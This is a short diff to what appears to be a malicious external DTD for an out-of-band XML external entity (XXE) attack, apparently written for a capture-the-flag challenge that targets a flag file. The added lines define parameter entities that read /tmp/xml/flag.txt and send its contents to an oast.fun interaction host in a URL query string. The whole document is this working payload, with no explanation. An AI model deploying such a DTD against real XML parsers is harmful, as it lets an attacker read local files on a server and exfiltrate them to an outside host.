@@ -1,2 +1,5 @@
-<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
-<!ENTITY exfiltrate SYSTEM "http://%file;.zmjuwyodyesoodtaz3c6990ax72.oast.fun/">
+<!ENTITY % file SYSTEM "file:///tmp/xml/flag.txt">
+<!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://dbndbnrdbqttnejtwjkv9152708nz4ybg.oast.fun/?data=%file;'>">
+%eval;
+%exfiltrate;
+
